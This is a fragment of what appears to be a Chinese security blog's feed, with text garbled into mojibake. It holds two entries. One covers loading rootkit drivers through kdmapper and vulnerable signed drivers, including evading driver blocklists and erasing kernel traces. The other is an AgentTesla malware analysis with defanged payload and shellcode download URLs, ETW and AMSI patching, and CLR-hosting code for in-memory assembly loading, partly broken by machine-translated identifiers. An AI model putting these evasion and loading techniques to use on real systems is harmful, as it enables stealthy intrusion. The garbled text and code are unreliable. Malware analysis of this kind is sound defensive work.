    <content type="html"><![CDATA[<h2 id="rootkitç®€ä»‹"><a href="#rootkitç®€ä»‹" class="headerlink" title="rootkitç®€ä»‹"></a>rootkitç®€ä»‹</h2><p>Rootkit æ˜¯æœ€éšè”½çš„æ¶æ„è½¯ä»¶ä¹‹ä¸€ã€‚ä¸è¯•å›¾ä¼ æ’­æˆ–ç ´åæ•°æ®çš„ä¼ ç»Ÿç—…æ¯’æˆ–è •è™«ä¸åŒï¼ŒRootkit çš„è®¾è®¡ä¸»è¦ç›®æ ‡æ˜¯è§„é¿æ£€æµ‹ã€‚å®ƒä»¬ä¼šæ·±æ·±åµŒå…¥æ“ä½œç³»ç»Ÿï¼Œä»¥éšè—è‡ªèº«ä»¥åŠå…¶ä»–æ¶æ„è½¯ä»¶çš„å­˜åœ¨ã€‚è¿™ç§ä¸è¢«å‘ç°çš„èƒ½åŠ›ä½¿å¾— Rootkit æ ¼å¤–å±é™©ï¼Œå› ä¸ºå®ƒä»¬å¯ä»¥åœ¨ç³»ç»Ÿä¸­é•¿æœŸé©»ç•™ï¼Œæ”¶é›†æ•æ„Ÿä¿¡æ¯æˆ–è¿›è¡Œæœªç»æˆæƒçš„è®¿é—®ï¼Œè€Œä¸ä¼šè§¦å‘å¸¸è§çš„å®‰å…¨è­¦æŠ¥ã€‚</p><p>è¯¦ç»†å¯ä»¥å‚è€ƒå¦‚ä¸‹ç½‘ç«™<a href="https://medium.com/aardvark-infinity/understanding-rootkits-a-stealthy-threat-d2287d4ba313">https://medium.com/aardvark-infinity/understanding-rootkits-a-stealthy-threat-d2287d4ba313</a></p><p>è¿™ç¯‡æ–‡ç« ä¸»è¦é’ˆå¯¹äºå†…æ ¸å±‚æ€ä¹ˆåšrootkitï¼Œå°±æ˜¯åŠ è½½é©±åŠ¨ï¼Œé€šä¿¡é©±åŠ¨åšä¸€äº›æ“ä½œã€‚</p><h2 id="é©±åŠ¨åŠ è½½"><a href="#é©±åŠ¨åŠ è½½" class="headerlink" title="é©±åŠ¨åŠ è½½"></a>é©±åŠ¨åŠ è½½</h2><p>å¼€å‘ rootkit æˆ–æ”»å‡»æ€§é©±åŠ¨ç¨‹åºï¼Œæ‚¨å¾ˆå¯èƒ½ä¼šå°†å…¶åŠ è½½åˆ°å¯ç”¨äº†æµ‹è¯•ç­¾åçš„å¼€å‘è®¡ç®—æœºä¸Šã€‚ç„¶è€Œï¼Œåœ¨å®é™…åœºæ™¯ä¸­ï¼Œå°¤å…¶æ˜¯åœ¨æ‚¨å¯èƒ½éœ€è¦éƒ¨ç½² rootkit çš„ç¯å¢ƒä¸­ï¼Œåœ¨ç›®æ ‡è®¡ç®—æœºä¸Šå¯ç”¨æµ‹è¯•ç­¾åé€šå¸¸å¹¶éæœ€ä½³é€‰æ‹©ã€‚å¦‚æœæ‚¨æ²¡æœ‰æœ‰æ•ˆè¯ä¹¦ï¼Œæˆ–è€…æƒ³è¦ä½¿ç”¨æ³„éœ²çš„è¯ä¹¦æ¥ç­¾åé©±åŠ¨ç¨‹åºï¼Œåˆ™å¿…é¡»æ‰‹åŠ¨æ˜ å°„é©±åŠ¨ç¨‹åºæ‰èƒ½å°†å…¶åŠ è½½åˆ°ç›®æ ‡è®¡ç®—æœºä¸Šã€‚</p><p>å¯¹äºç†Ÿæ‚‰ç”¨æˆ·ç©ºé—´æ¶æ„è½¯ä»¶çš„äººæ¥è¯´ï¼Œæ‰‹åŠ¨æ˜ å°„é©±åŠ¨ç¨‹åºçš„æ¦‚å¿µç±»ä¼¼äºåå°„å¼ PE åŠ è½½â€”â€”æ‚¨ä¸æ˜¯ä»ç£ç›˜åŠ è½½ç¨‹åºï¼Œè€Œæ˜¯æ‰‹åŠ¨å°†å…¶æ˜ åƒå¸ƒå±€åˆ°å†…å­˜ä¸­ã€‚ç„¶è€Œï¼Œé©±åŠ¨ç¨‹åºå¿…é¡»æ˜ å°„åˆ°å†…æ ¸å†…å­˜ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¿…é¡»åœ¨ Ring 0 ä¸­å·²ç»æ‹¥æœ‰æŸç§å†™å…¥åŸè¯­ã€‚è¿™æ­£æ˜¯ BYOVD å’Œ<a href="https://loldrivers.io/">LOLDrivers</a>å‘æŒ¥ä½œç”¨çš„åœ°æ–¹â€”â€”å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨å·²ç­¾åä½†æ˜“å—æ”»å‡»çš„é©±åŠ¨ç¨‹åºå°†ä»»æ„æ•°æ®å†™å…¥å†…æ ¸ç©ºé—´ï¼Œæˆ‘ä»¬å°±å¯ä»¥åƒåˆæ³•åŠ è½½ä¸€æ ·å°† rootkit é©±åŠ¨ç¨‹åºçš„æ˜ åƒå†™å…¥å†…å­˜ã€‚</p><h3 id="ä½¿ç”¨-kdmapper-æ‰‹åŠ¨æ˜ å°„é©±åŠ¨ç¨‹åº"><a href="#ä½¿ç”¨-kdmapper-æ‰‹åŠ¨æ˜ å°„é©±åŠ¨ç¨‹åº" class="headerlink" title="ä½¿ç”¨ kdmapper æ‰‹åŠ¨æ˜ å°„é©±åŠ¨ç¨‹åº"></a>ä½¿ç”¨ kdmapper æ‰‹åŠ¨æ˜ å°„é©±åŠ¨ç¨‹åº</h3><p>æœ€è‘—åçš„å°†é©±åŠ¨ç¨‹åºæ˜ å°„åˆ°å†…å­˜çš„å·¥å…·æ˜¯<a href="https://github.com/TheCruZ/kdmapper">kdmapper</a>ï¼Œå®ƒåˆ©ç”¨<code>iqvw64e.sys</code>è‹±ç‰¹å°”çš„ä¸€ä¸ªæ˜“å—æ”»å‡»çš„é©±åŠ¨ç¨‹åºå°†ä»»æ„é©±åŠ¨ç¨‹åºå†™å…¥å†…æ ¸ã€‚å½“ç„¶ï¼Œè¿™ä¸ª loldriver åœ¨æŸäº›ç¯å¢ƒä¸‹ä¼šè¢«åˆ—å…¥é»‘åå•ã€‚ä¸è¿‡ï¼Œä½ å¯ä»¥ç”¨ä»»ä½•å…¶ä»–æ˜“å—æ”»å‡»çš„é©±åŠ¨ç¨‹åºï¼ˆæœ€å¥½æ˜¯åªæœ‰ä½ çš„çº¢é˜ŸçŸ¥é“çš„é©±åŠ¨ç¨‹åºï¼‰æ›¿æ¢å†…å­˜åŸè¯­ï¼Œå¹¶ä¸”ä»ç„¶å¯ä»¥ä½¿ç”¨ kdmapper æ¥éƒ¨ç½²ä½ çš„ rootkitã€‚</p><p>æ­£å¦‚æˆ‘ä¸Šé¢æè¿°çš„ï¼Œæ‰‹åŠ¨æ˜ å°„çš„è¿‡ç¨‹ä¸åå°„å¼ PE æ³¨å…¥éå¸¸ç›¸ä¼¼ï¼Œå› ä¸ºæœ€ç»ˆï¼Œé©±åŠ¨ç¨‹åºåªä¸è¿‡æ˜¯å¦ä¸€ä¸ª PEã€‚ä¾‹å¦‚ï¼Œå°†èŠ‚å†™å…¥å†…å­˜ï¼Œè§£æå¯¼å…¥å¹¶åº”ç”¨é‡å®šä½ï¼Œæ“¦é™¤æ˜ åƒå¤´ä»¥å®ç°éšèº«ï¼Œæœ€ç»ˆè°ƒç”¨é©±åŠ¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚</p><p>é™¤äº†è¿™ä¸ªæ˜ å°„è¿‡ç¨‹ä¹‹å¤–ï¼Œkdmapper è¿˜è´Ÿè´£æ¸…é™¤æ­£åœ¨åŠ è½½çš„è‹±ç‰¹å°”é©±åŠ¨ç¨‹åºçš„ç—•è¿¹ã€‚æœ¬æ–‡çš„ç›®çš„å¹¶éæè¿°è¿™ä¸€ç‚¹ï¼Œå› ä¸ºè¿™æ˜¯æ˜ å°„å™¨è€Œä¸æ˜¯ rootkit åº”è¯¥å¤„ç†çš„äº‹æƒ…ï¼Œä½†å®ƒæ¶‰åŠæ¸…é™¤å„ç§æœªè®°å½•çš„æ•°æ®ç»“æ„ä¸­çš„æ¡ç›®ï¼Œä¾‹å¦‚<a href="https://www.unknowncheats.me/forum/anti-cheat-bypass/324665-clearing-piddbcachetable.html">PiDDBCacheTable</a>ã€<a href="https://revers.engineering/hiding-drivers-on-windows-10/">MmUnloadedDrivers</a>æ•°ç»„ã€<a href="https://www.informit.com/articles/article.aspx?p=22443&seqNum=7">g_KernelHashBucketList</a>ä»¥åŠ<code>RuntimeDriver*</code>Defender é©±åŠ¨ <code>WdFilter.sys</code> <a href="https://n4r1b.netlify.app/posts/2020/03/dissecting-the-windows-defender-driver-wdfilter-part-3/">ç¨‹åº</a>ä½¿ç”¨çš„ç»“æ„ä½“ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250828185914197.png" alt="image-20250828185914197"></p><p>æ­£å¸¸åŠ è½½æ²¡æœ‰ç­¾åçš„é©±åŠ¨æç¤ºå¦‚ä¸‹ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250829224142241.png" alt="image-20250829224142241"></p><p>ä½¿ç”¨å†…å­˜åŠ è½½<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250829224313680.png" alt="image-20250829224313680"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250829224352977.png" alt="image-20250829224352977"></p><p>å†…å­˜åŠ è½½çš„çŸ¥è¯†å¯ä»¥çœ‹å¦ä¸€ç¯‡æ–‡ç« </p><p><a href="https://250wuyifan.github.io/2025/08/29/%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E9%A9%B1%E5%8A%A8/">å†…å­˜åŠ è½½é©±åŠ¨ | CHANGMENâ€™ä¸ªäººåšå®¢</a></p><p><a href="https://250wuyifan.github.io/2025/08/30/kdmapper%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90/">kdmapperå†…å­˜åŠ è½½ä»£ç å¿«é€Ÿè§£æ | CHANGMENâ€™ä¸ªäººåšå®¢</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;rootkitç®€ä»‹&quot;&gt;&lt;a href=&quot;#rootkitç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;rootkitç®€ä»‹&quot;&gt;&lt;/a&gt;rootkitç®€ä»‹&lt;/h2&gt;&lt;p&gt;Rootkit æ˜¯æœ€éšè”½çš„æ¶æ„è½¯ä»¶ä¹‹ä¸€ã€‚ä¸è¯•å›¾ä¼ æ’­æˆ–ç ´åæ•°æ®çš„ä¼ ç»Ÿç—…æ¯’æˆ–è •è™«ä¸åŒï¼ŒR</summary>
      
    
    
    
    <category term="Windows Kernelå®‰å…¨ç ”ç©¶" scheme="https://250wuyifan.github.io/categories/Windows-Kernel%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="Windows Kernelå®‰å…¨ç ”ç©¶" scheme="https://250wuyifan.github.io/tags/Windows-Kernel%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>AgentTeslaä½¿ç”¨çš„æœ¬æœºè¿›ç¨‹CLR æ‰˜ç®¡åˆ†æ</title>
    <link href="https://250wuyifan.github.io/2025/08/22/AgentTesla%E4%BD%BF%E7%94%A8%E7%9A%84%E6%9C%AC%E6%9C%BA%E8%BF%9B%E7%A8%8BCLR-%E6%89%98%E7%AE%A1%E5%88%86%E6%9E%90/"/>
    <id>https://250wuyifan.github.io/2025/08/22/AgentTesla%E4%BD%BF%E7%94%A8%E7%9A%84%E6%9C%AC%E6%9C%BA%E8%BF%9B%E7%A8%8BCLR-%E6%89%98%E7%AE%A1%E5%88%86%E6%9E%90/</id>
    <published>2025-08-22T07:53:47.000Z</published>
    <updated>2025-08-23T04:03:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>SonicWall Capture Labs å¨èƒç ”ç©¶å›¢é˜Ÿåœ¨æœ¬æœº 64 ä½è¿›ç¨‹ä¸­è§‚å¯Ÿåˆ°æ— æ–‡ä»¶ .Net æ‰˜ç®¡ä»£ç æ³¨å…¥ã€‚æœ¬æœºä»£ç æˆ–éæ‰˜ç®¡ä»£ç æ˜¯æŒ‡ C&#x2F;C++ ç­‰ä½çº§ç¼–è¯‘ä»£ç ã€‚æ‰˜ç®¡ä»£ç æ˜¯æŒ‡é’ˆå¯¹ .NET ç¼–å†™çš„ä»£ç ï¼Œå¦‚æœæ²¡æœ‰ CLRï¼ˆMicrosoft .NET å¼•æ“ï¼‰è¿è¡Œæ—¶åº“ï¼Œåˆ™æ— æ³•è¿è¡Œã€‚æ³¨å…¥çš„ä»£ç å±äº AgentTesla æ¶æ„è½¯ä»¶ã€‚</p><h1 id="æŠ€æœ¯åˆ†æ"><a href="#æŠ€æœ¯åˆ†æ" class="headerlink" title="æŠ€æœ¯åˆ†æ"></a>æŠ€æœ¯åˆ†æ</h1><p>åˆå§‹æ„ŸæŸ“åª’ä»‹æ˜¯å®¢æˆ·ç«¯ä»¥ç”µå­é‚®ä»¶é™„ä»¶å½¢å¼æ”¶åˆ°çš„Wordæ–‡æ¡£ã€‚æ‰“å¼€æ­¤æ–‡æ¡£åï¼Œå®ƒä¼šè¦æ±‚ç”¨æˆ·å¯ç”¨VBAå®ã€‚å¦‚æœå¯ç”¨ï¼Œæ­¤VBAå®ä¼šä»äº’è”ç½‘ä¸‹è½½å¹¶æ‰§è¡Œä¸€ä¸ª64ä½å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>ä¸‹è½½çš„äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯ä¸€ä¸ª 64 ä½ Rust ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚æˆ‘ä»¬å°†é‡ç‚¹å…³æ³¨è¯¥äºŒè¿›åˆ¶æ–‡ä»¶æ‰€ä½¿ç”¨çš„æŠ€æœ¯ï¼Œå³åˆ©ç”¨ CLR Hosting å°†æ¶æ„ AgentTesla æœ‰æ•ˆè½½è·æ³¨å…¥å…¶è‡ªèº«çš„è¿›ç¨‹å†…å­˜ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸‹è½½çš„64ä½å¯æ‰§è¡Œæ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ã€‚</p><p>MD5ï¼š4521162D45EFC83FA76C4B5C0D405265</p><p>SHA256ï¼šF00ED06A1D402ECF760EC92F3280EF6C09E76036854ABACADCAC9311706ED97D</p><p>ä¸‹è½½ 64 ä½å¯æ‰§è¡Œæ–‡ä»¶çš„ URLï¼š</p><p>https[:]&#x2F;&#x2F;New-Coder[.]cc&#x2F;Users&#x2F;signed_20240329011751156[.]exe</p><h1 id="ç¦ç”¨-Windows-äº‹ä»¶è·Ÿè¸ª-ETW"><a href="#ç¦ç”¨-Windows-äº‹ä»¶è·Ÿè¸ª-ETW" class="headerlink" title="ç¦ç”¨ Windows äº‹ä»¶è·Ÿè¸ª (ETW)"></a>ç¦ç”¨ Windows äº‹ä»¶è·Ÿè¸ª (ETW)</h1><p>åœ¨æ‰§è¡Œ Rust äºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼Œå®ƒä½¿ç”¨ NtProtectVirtualMemoryã€WriteProcessMemory å’Œ FlushInstructionCache API ä¿®è¡¥æ¥è‡ª NTDLL çš„â€œEtwEventWriteâ€APIã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-1-after-malware-patches-the-EtwEventWrite-API.png" alt="Figure-1-after-malware-patches-the-EtwEventWrite-API"></p><p>å›¾ 1ï¼šæ¶æ„è½¯ä»¶ä¿®è¡¥â€œEtwEventWriteâ€API å</p><p>è¯¥ 64 ä½æ¶æ„è½¯ä»¶è¿›ç¨‹ä»ä»¥ä¸‹ URL ä¸‹è½½åŒ…å« AgenetTesla æœ‰æ•ˆè´Ÿè½½çš„ç¼–ç  shellcodeã€‚</p><p>Shellcodeçš„URLï¼š</p><p>https[:]&#x2F;&#x2F;New-Coder[.]cc&#x2F;Users&#x2F;shellcodeAny_20240329011339585[.]bin</p><p>æ¥ä¸‹æ¥ï¼Œæ¶æ„è½¯ä»¶ä½¿ç”¨â€œEnumSystemLocalesAâ€API å¼€å§‹æ‰§è¡Œä¸‹è½½çš„ shellcodeï¼Œå¹¶å°† shellcode çš„åœ°å€ä½œä¸ºå›è°ƒå‡½æ•°å‚æ•°ä¼ é€’ç»™ APIã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-2-moved-shellcode-from-read-write-memory-to-executable-memory-and-starts-its-execution-1030x496.png" alt="img"></p><p>å›¾ 2 **ï¼š**å°† shellcode ä»è¯»å†™å†…å­˜ç§»åŠ¨åˆ°å¯æ‰§è¡Œå†…å­˜å¹¶å¼€å§‹æ‰§è¡Œ</p><p>Shellcode è§£æ PEB å’Œ PEB_LDR_DATA æ¥åŠ¨æ€è§£æ APIã€‚å®ƒå°†ä½¿ç”¨ API å“ˆå¸ŒæŠ€æœ¯æ¥è§£æ VirtualAllocã€VirtualFree å’Œ RtlExitUserProcess APIã€‚</p><p>æ¥ä¸‹æ¥ï¼Œshellcode ä½¿ç”¨â€œVirtualAllocâ€ API åˆ†é…è¯»å†™å†…å­˜ï¼Œå¹¶å°† 0x3E3C0 å­—èŠ‚ä» shellcode ç§»åŠ¨åˆ°åˆ†é…çš„å†…å­˜ä¸­ã€‚è¿™äº›å­—èŠ‚å°±æ˜¯ç¼–ç åçš„ AgentTesla Payloadã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-3-moved-shellcode-data-in-read-write-memory-and-started-decryption-routine-1030x500.png" alt="img"></p><p>å›¾ 3ï¼šå°† Shellcode æ•°æ®ç§»åŠ¨åˆ°è¯»å†™å†…å­˜ä¸­å¹¶å¯åŠ¨è§£å¯†ä¾‹ç¨‹</p><p>å¦‚ä¸Šå›¾3æ‰€ç¤ºï¼Œå‰4ä¸ªå­—èŠ‚ï¼ˆDWORDï¼‰æ˜¯ç¼–ç æ•°æ®çš„å¤§å°ï¼Œåé¢è·Ÿç€ç¼–ç æ•°æ®ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œå®ƒä¼šè§£å¯†æœ‰æ•ˆè½½è·ã€‚Shellcode ä½¿ç”¨è‡ªå®šä¹‰çš„è§£å¯†ä¾‹ç¨‹ï¼Œå¾ªç¯æ‰§è¡Œå•å­—èŠ‚å¼‚æˆ–è§£å¯†ï¼Œæ¯æ¬¡è¿­ä»£éƒ½ä½¿ç”¨ 0x10 å­—èŠ‚çš„åŠ å¯†å¯†é’¥è§£å¯†æœ‰æ•ˆè½½è·ä¸­çš„ 0x10 å­—èŠ‚ã€‚åœ¨è§£å¯†å¾ªç¯ä¸­ï¼Œæ¶æ„è½¯ä»¶æ¯æ¬¡éƒ½ä¼šä½¿ç”¨ç”±å¼‚æˆ–å’Œç®—æœ¯è¿ç®—ç»„åˆå¾—å‡ºçš„ä¸åŒåŠ å¯†å¯†é’¥ã€‚å®ƒä¼šè§£å¯†å†…å­˜ç¼“å†²åŒºä¸­çš„ 0x3E184 å­—èŠ‚ï¼Œä»¥è·å–æœ€ç»ˆçš„æœ‰æ•ˆè½½è·ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-4-Single-byte-XOR-decryption-1030x287.png" alt="img"></p><p>å›¾4ï¼šå•å­—èŠ‚XORè§£å¯†</p><p>æ¥ä¸‹æ¥ï¼Œshellcode è¯»å– DLL åç§°æ•°ç»„ï¼Œè¯¥æ•°ç»„åŒ…å«æ¶æ„è½¯ä»¶æ‰§è¡Œæ“ä½œæ‰€éœ€çš„ DLL åç§°ã€‚è¯¥æ•°ç»„ä¸ºâ€œole32;oleaut32;wininet;mscoree;shell32â€ã€‚</p><p>Shellcode è§£æ PEB ç»“æ„ä»¥æ£€æŸ¥å·²åŠ è½½æ¨¡å—åˆ—è¡¨ä¸­æ˜¯å¦å­˜åœ¨ä¸Šè¿° DLLï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨â€œLoadLibraryAâ€API åŠ è½½ DLLã€‚</p><p>ä¸€æ—¦æ‰€éœ€çš„ DLL è¢«åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå®ƒå°±ä¼šä½¿ç”¨ API å“ˆå¸ŒæŠ€æœ¯è§£ææ›´å¤š APIï¼Œä¾‹å¦‚â€œVirtualProtectâ€ã€â€œSafeArrayCreateâ€ã€â€œCLRCreateInstanceâ€ç­‰ã€‚</p><h1 id="ä½¿ç”¨å†…å­˜ä¿®è¡¥æ¥ç»•è¿‡-AMSI"><a href="#ä½¿ç”¨å†…å­˜ä¿®è¡¥æ¥ç»•è¿‡-AMSI" class="headerlink" title="ä½¿ç”¨å†…å­˜ä¿®è¡¥æ¥ç»•è¿‡ AMSI"></a>ä½¿ç”¨å†…å­˜ä¿®è¡¥æ¥ç»•è¿‡ AMSI</h1><p>æ¥ä¸‹æ¥ï¼Œshellcode ä¿®è¡¥â€œAmsiScanBufferâ€å’Œâ€œAmsiScanStringâ€APIï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-5-AmsiScanBuffer-API-after-patching-1030x254.png" alt="img"></p><p>å›¾ 5ï¼šä¿®è¡¥åçš„â€œAmsiScanBufferâ€ API</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250823120042256.png" alt="image-20250823120042256"></p><p>å›¾ 6ï¼šä¿®è¡¥åçš„â€œAmsiScanStringâ€ API</p><p><strong>ç¦ç”¨äº‹ä»¶è·Ÿè¸ªï¼ˆç¬¬äºŒæ¬¡ï¼‰</strong></p><p>æˆ‘ä»¬è§‚å¯Ÿåˆ°shellcodeä¸­ç¬¬äºŒæ¬¡ä¿®è¡¥æ˜¯ä¸ºäº†ç¦ç”¨äº‹ä»¶è·Ÿè¸ªï¼Œè¿™å¯èƒ½æ˜¯ä¸ºäº†ç¡®è®¤ä¿®è¡¥ä»åœ¨ç»§ç»­ã€‚å®ƒä½¿ç”¨ä¸€ä¸ªå­—èŠ‚â€œ0xCCâ€ï¼ˆè¿”å›æŒ‡ä»¤ï¼‰ä¿®è¡¥äº†â€œEtwEventWriteâ€APIã€‚</p><p>æ¥ä¸‹æ¥ï¼Œshellcode å¼€å§‹ CLR æ‰˜ç®¡ã€‚</p><p>ä»¥ä¸‹æ˜¯æ‰§è¡Œ CLR Hosting æ‰€éœ€çš„æ­¥éª¤ï¼Œé¡ºåºå¦‚ä¸‹ï¼š</p><h1 id="CLR-Hosting"><a href="#CLR-Hosting" class="headerlink" title="CLR Hosting"></a>CLR Hosting</h1><h2 id="åˆ›å»º-CLR-MetaHost-å®ä¾‹ï¼š"><a href="#åˆ›å»º-CLR-MetaHost-å®ä¾‹ï¼š" class="headerlink" title="åˆ›å»º CLR MetaHost å®ä¾‹ï¼š"></a>åˆ›å»º CLR MetaHost å®ä¾‹ï¼š</h2><p>ICLRMetaHost* pMetaHost &#x3D; NULL;</p><p>CLRCreateInstanceï¼ˆCLSID_CLRMetaHostï¼ŒIID_ICLRMetaHostï¼Œï¼ˆLPVOID *ï¼‰ï¼†pMetaHostï¼‰;</p><h2 id="æšä¸¾å·²å®‰è£…çš„è¿è¡Œæ—¶ï¼š"><a href="#æšä¸¾å·²å®‰è£…çš„è¿è¡Œæ—¶ï¼š" class="headerlink" title="æšä¸¾å·²å®‰è£…çš„è¿è¡Œæ—¶ï¼š"></a>æšä¸¾å·²å®‰è£…çš„è¿è¡Œæ—¶ï¼š</h2><p>pMetaHost-&gt;æšä¸¾å·²å®‰è£…çš„è¿è¡Œæ—¶é—´ï¼ˆ&amp;å·²å®‰è£…çš„è¿è¡Œæ—¶é—´ï¼‰ï¼›</p><p>é€šè¿‡è¿è¡Œæ—¶è¿›è¡Œæšä¸¾å¹¶å°è¯•æ‰¾åˆ°ç³»ç»Ÿä¸Šå®‰è£…çš„ç‰¹å®š dotnet ç‰ˆæœ¬ã€‚</p><p>å¿…é¡»ä½¿ç”¨ ICLRRuntimeInfo æ¥å£ä¸­çš„â€œGetVersionStringâ€æ–¹æ³•æ¥æŸ¥æ‰¾æ”¯æŒçš„ .NET Framework ç‰ˆæœ¬ã€‚æ­¤ .NET Framework ç‰ˆæœ¬å­—ç¬¦ä¸²å°†ä¼ é€’ç»™ GetRuntime APIã€‚</p><h2 id="ä½¿ç”¨â€œGetRuntimeâ€è·å–-RuntimeInfoï¼š"><a href="#ä½¿ç”¨â€œGetRuntimeâ€è·å–-RuntimeInfoï¼š" class="headerlink" title="ä½¿ç”¨â€œGetRuntimeâ€è·å– RuntimeInfoï¼š"></a>ä½¿ç”¨â€œGetRuntimeâ€è·å– RuntimeInfoï¼š</h2><p>ICLRRuntimeInfo* è¿è¡Œæ—¶ä¿¡æ¯ &#x3D; NULL;</p><p>pMetaHost-&gt;GetRuntime(sz_runtimeVersion, IID_ICLRRuntimeInfo, (LPVOID*)&amp;runtimeInfo);</p><h2 id="è·å–ICorRuntimeHostæ¥å£ï¼š"><a href="#è·å–ICorRuntimeHostæ¥å£ï¼š" class="headerlink" title="è·å–ICorRuntimeHostæ¥å£ï¼š"></a>è·å–ICorRuntimeHostæ¥å£ï¼š</h2><p>ICorRuntimeHost æ¥å£å…è®¸ä»æœ¬æœºä»£ç å¯¹æ‰˜ç®¡è¿è¡Œæ—¶è¿›è¡Œæ›´å¤šæ§åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨ ICLRRuntimeInfo::GetInterface è¿›è¡Œæ£€ç´¢</p><p>ICorRuntimeHost* pCorRuntimeHost &#x3D;NULL;</p><p>runtimeInfo-&gt;GetInterface(CLSID_CorRuntimeHost,IID_ICorRuntimeHost,(LPVOID*)&amp; pCorRuntimeHost);</p><h2 id="æ£€ç´¢å½“å‰è¿›ç¨‹çš„é»˜è®¤-AppDomainï¼š"><a href="#æ£€ç´¢å½“å‰è¿›ç¨‹çš„é»˜è®¤-AppDomainï¼š" class="headerlink" title="æ£€ç´¢å½“å‰è¿›ç¨‹çš„é»˜è®¤ AppDomainï¼š"></a>æ£€ç´¢å½“å‰è¿›ç¨‹çš„é»˜è®¤ AppDomainï¼š</h2><p>ICorRuntimeHost æ¥å£å…è®¸æ£€ç´¢å½“å‰è¿›ç¨‹çš„é»˜è®¤ AppDomainã€‚</p><p>IUnknown* appDomainThunkï¼›</p><p>pCorRuntimeHost-&gt;è·å–é»˜è®¤åŸŸï¼ˆ&amp;appDomainThunkï¼‰ï¼›</p><p>_AppDomain* é»˜è®¤AppDomain &#x3D; NULL;</p><p>appDomainThunk-&gt;QueryInterface(IID_AppDomainï¼Œ&amp;defaultAppDomain);</p><h2 id="åˆ›å»º-SafeArrayï¼š"><a href="#åˆ›å»º-SafeArrayï¼š" class="headerlink" title="åˆ›å»º SafeArrayï¼š"></a>åˆ›å»º SafeArrayï¼š</h2><p>æˆ‘ä»¬å¿…é¡»åˆ›å»º SafeArray å¹¶å°† MSIL æœ‰æ•ˆè´Ÿè½½å¤åˆ¶åˆ°æ­¤ SafeArrayï¼Œå› ä¸ºæˆ‘ä»¬æ— æ³•å‘å°†ç¨‹åºé›†åŠ è½½åˆ°åº”ç”¨ç¨‹åºåŸŸçš„â€œLoad_3â€æ–¹æ³•æä¾›éæ‰˜ç®¡å­—èŠ‚æ•°ç»„ã€‚</p><p>SAFEARRAYBOUND è¾¹ç•Œï¼›</p><p>bounds.cElements &#x3D; sizeof (rawAssemblyByteArray);</p><p>è¾¹ç•Œ.lLbound &#x3D; 0;</p><p>SAFEARRAY* safeArray &#x3D; SafeArrayCreate(VT_UI1, 1, bounds);</p><p>SafeArrayLockï¼ˆå®‰å…¨æ•°ç»„ï¼‰ï¼›</p><p>memcpy(safeArray-&gt;pvDataï¼ŒrawAssemblyByteArrayï¼Œsizeof(rawAssemblyByteArray));</p><p>SafeArrayUnlockï¼ˆå®‰å…¨æ•°ç»„ï¼‰ï¼›</p><h2 id="å°†ç¨‹åºé›†åŠ è½½åˆ°-AppDomainï¼š"><a href="#å°†ç¨‹åºé›†åŠ è½½åˆ°-AppDomainï¼š" class="headerlink" title="å°†ç¨‹åºé›†åŠ è½½åˆ° AppDomainï¼š"></a>å°†ç¨‹åºé›†åŠ è½½åˆ° AppDomainï¼š</h2><p>_AssemblyPtr managedAssembly &#x3D; ç©ºï¼›</p><p>defaultAppDomain-&gt;Load_3ï¼ˆsafeArrayï¼Œ&amp;managedAssemblyï¼‰</p><h2 id="æ‰¾åˆ°å·²åŠ è½½ç¨‹åºé›†çš„å…¥å£ç‚¹ï¼š"><a href="#æ‰¾åˆ°å·²åŠ è½½ç¨‹åºé›†çš„å…¥å£ç‚¹ï¼š" class="headerlink" title="æ‰¾åˆ°å·²åŠ è½½ç¨‹åºé›†çš„å…¥å£ç‚¹ï¼š"></a>æ‰¾åˆ°å·²åŠ è½½ç¨‹åºé›†çš„å…¥å£ç‚¹ï¼š</h2><p>_MethodInfoPtr pMethodInfo &#x3D; NULL;</p><p>managedAssembly-&gt;get_EntryPointï¼ˆ&amp;pMethodInfoï¼‰</p><h2 id="è°ƒç”¨å…¥å£ç‚¹ï¼š"><a href="#è°ƒç”¨å…¥å£ç‚¹ï¼š" class="headerlink" 